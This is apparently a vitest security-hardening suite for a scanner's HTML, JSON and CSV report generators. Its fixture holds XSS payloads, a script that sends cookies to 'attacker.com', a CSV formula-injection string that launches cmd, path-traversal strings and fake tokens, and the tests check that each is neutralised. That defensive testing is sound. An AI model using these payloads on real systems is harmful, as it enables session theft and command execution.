import { describe, it, expect } from 'vitest';
import { generateHtmlReport } from '../../src/main/reports/html-generator.js';
import { generateJsonReport } from '../../src/main/reports/json-generator.js';
import { generateCsvReport } from '../../src/main/reports/csv-generator.js';
import { resolveSafeReportPath, sanitizeReportFilename } from '../../src/main/reports/paths.js';
import type { ReportModel } from '../../src/main/reports/types.js';

describe('Report Adversarial & Security Hardening Suite', () => {
  const adversarialModel: ReportModel = {
    reportId: 'rep-adv-1111',
    title: '<script>alert("Title XSS")</script>',
    site: {
      id: 'site-adv-1',
      projectId: 'proj-1',
      name: '<img src=x onerror="alert(\'Site Name XSS\')">',
      baseUrl: 'javascript:alert("Site URL XSS")',
      platformType: 'wordpress',
      environmentType: 'production',
      description: '"><svg/onload=alert("Desc XSS")>',
    },
    scanRun: {
      id: 'scan-adv-1',
      siteId: 'site-adv-1',
      scanType: 'full',
      status: 'completed',
      targetUrl: 'javascript:alert("Target URL XSS")',
      startedAt: '2026-11-07T10:00:00Z',
      completedAt: '2026-11-07T10:01:00Z',
      cancelledAt: null,
      durationMs: 60000,
      config: {
        token: 'secret-api-token-value',
        adminPassword: 'Password123!',
      },
    },
    findings: [
      {
        id: 'f-adv-1',
        scanRunId: 'scan-adv-1',
        ruleId: 'SEC-XSS-TEST',
        category: 'security',
        title: '<b onmouseover="alert(\'Title Hover XSS\')">Vulnerability</b>',
        description: '<iframe src="javascript:alert(\'Iframe XSS\')"></iframe>',
        severity: 'critical',
        confidence: 'confirmed',
        status: 'active',
        targetUrl: 'javascript:alert("Finding Target XSS")',
        evidence: {
          authorization: 'Bearer secret-jwt-bearer-token-12345',
          cookie: 'admin_session=sensitive_cookie_value_xyz',
          rawLeak: 'Server returned Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.test-sig with key AIzaSyFakeKey123',
          homePath: 'C:\\Users\\JohnDoe\\Documents\\secret.txt',
        },
        remediation: '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
        references: [
          'javascript:alert("Ref XSS")',
          'data:text/html,<script>alert(1)</script>',
          'https://valid-reference.org/advisory',
        ],
        createdAt: '2026-11-07T10:00:30Z',
      },
      {
        id: 'f-adv-2',
        scanRunId: 'scan-adv-1',
        ruleId: 'CSV-INJECTION-TEST',
        category: 'security',
        title: '=cmd|\'/C calc\'!A0',
        description: '+2+5+cmd',
        severity: 'high',
        confidence: 'potential',
        status: 'active',
        targetUrl: 'https://example.com/',
        evidence: null,
        remediation: '-1+1',
        references: null,
        createdAt: '2026-11-07T10:00:40Z',
      },
    ],
    summary: {
      totalFindings: 2,
      bySeverity: { critical: 1, high: 1, medium: 0, low: 0, info: 0 },
      byCategory: { security: 2 },
      confirmedCount: 1,
      potentialCount: 1,
      pagesScanned: 1,
      pagesFailed: 0,
      scanDurationMs: 60000,
      scanStatus: 'completed',
      generatedAt: '2026-11-07T10:02:00Z',
    },
    generatedAt: '2026-11-07T10:02:00Z',
    version: '1.0.0',
  };

  describe('Stored XSS & Injection Neutralization in HTML Reports', () => {
    it('escapes all attacker-controlled titles, site names, and descriptions without executable tags', () => {
      const html = generateHtmlReport(adversarialModel);

      // Title escaped
      expect(html).not.toContain('<script>alert("Title XSS")</script>');
      expect(html).toContain('&lt;script&gt;alert(&quot;Title XSS&quot;)&lt;/script&gt;');

      // Site name escaped
      expect(html).not.toContain('<img src=x onerror=');
      expect(html).toContain('&lt;img src=x onerror=&quot;alert(&#39;Site Name XSS&#39;)&quot;&gt;');

      // Finding description escaped
      expect(html).not.toContain('<iframe src=');
      expect(html).toContain('&lt;iframe src=&quot;javascript:alert(&#39;Iframe XSS&#39;)&quot;&gt;&lt;/iframe&gt;');

      // Remediation guidance escaped
      expect(html).not.toContain('<script>fetch(');
      expect(html).toContain('&lt;script&gt;fetch(&quot;https://attacker.com');
    });

    it('neutralizes dangerous javascript: and data: URLs in href attributes', () => {
      const html = generateHtmlReport(adversarialModel);

      // Disallow javascript: in anchor href
      expect(html).not.toContain('href="javascript:');
      expect(html).not.toContain('href="data:');

      // Valid reference URL must be preserved
      expect(html).toContain('href="https://valid-reference.org/advisory"');
    });

    it('enforces a strict zero-trust Content Security Policy', () => {
      const html = generateHtmlReport(adversarialModel);
      expect(html).toContain("default-src 'none'");
      expect(html).toContain("script-src 'none'");
      expect(html).toContain("object-src 'none'");
      expect(html).toContain("base-uri 'none'");
    });

    it('redacts all tokens, cookies, secrets, and private local paths in evidence blocks', () => {
      const html = generateHtmlReport(adversarialModel);

      expect(html).not.toContain('secret-jwt-bearer-token-12345');
      expect(html).not.toContain('sensitive_cookie_value_xyz');
      expect(html).not.toContain('JohnDoe');

      expect(html).toContain('[REDACTED_SECRET]');
      expect(html).toContain('[REDACTED_USER]');
    });
  });

  describe('Adversarial JSON Export Protection', () => {
    it('redacts credentials and JWTs inside structured JSON exports', () => {
      const json = generateJsonReport(adversarialModel);
      const parsed = JSON.parse(json);

      expect(parsed.scanRun.config.token).toBe('[REDACTED_SECRET]');
      expect(parsed.scanRun.config.adminPassword).toBe('[REDACTED_SECRET]');
      expect(parsed.findings[0].evidence.authorization).toBe('[REDACTED_SECRET]');
      expect(parsed.findings[0].evidence.cookie).toBe('[REDACTED_SECRET]');
      expect(parsed.findings[0].evidence.homePath).toContain('[REDACTED_USER]');
    });
  });

  describe('Adversarial CSV Formula Injection Protection', () => {
    it('neutralizes all spreadsheet formula injection triggers in CSV output', () => {
      const csv = generateCsvReport(adversarialModel);

      // Must prepend apostrophe to cells starting with =, +, -, @
      expect(csv).toContain("\"'=cmd|'/C calc'!A0\"");
      expect(csv).toContain("\"'+2+5+cmd\"");
      expect(csv).toContain("\"'-1+1\"");
    });
  });

  describe('Adversarial Filesystem Traversal Rejection', () => {
    const baseDir = 'D:\\ahmed\\reports';

    it('rejects relative path traversal payloads targeting system directories', () => {
      const attacks = [
        '../../../../../../Windows/System32/cmd.exe',
        '..\\..\\..\\..\\Windows\\System32\\cmd.exe',
        'sub/../../../../boot.ini',
        '..\\..\\..\\..\\..\\..\\etc\\passwd',
      ];

      for (const attack of attacks) {
        expect(() => resolveSafeReportPath(attack, baseDir)).toThrow('Path traversal rejected');
      }
    });

    it('sanitizes filename traversal attempts cleanly', () => {
      const traversalTitle = '../../../evil-name';
      const clean = sanitizeReportFilename(traversalTitle, 'html');
      expect(clean).not.toContain('/');
      expect(clean).not.toContain('\\');
      expect(clean).toBe('evil-name.html');
    });
  });
});
